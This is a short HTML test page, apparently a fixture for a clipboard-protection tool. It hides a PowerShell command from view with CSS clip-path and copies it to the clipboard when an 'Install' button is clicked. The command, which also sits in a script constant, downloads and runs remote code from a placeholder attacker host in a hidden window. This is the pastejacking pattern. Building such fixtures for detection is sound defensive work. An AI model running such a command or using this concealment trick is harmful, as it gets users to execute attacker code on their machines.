<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><meta name="darkreader-lock"><title>clip-path inset(100%)</title>
<script src="common.js"></script>
<style>
.cover { position:absolute; left:0; top:0; width:400px; height:60px; background:#fff; z-index:9; }
</style></head>
<body><h1>clip-path inset(100%)</h1>
<p>Click Install. The command is rendered on screen but cannot be read.</p>
<button id="go">Install</button>
<pre id="cmd" style="clip-path:inset(100%)">powershell -w hidden -c "iwr https://evil.invalid/f2 | iex"</pre>
<script>
const CMD = 'powershell -w hidden -c "iwr https://evil.invalid/f2 | iex"';
document.getElementById("go").addEventListener("click", () => window.__clipguard.writeText(CMD));
</script>
</body></html>
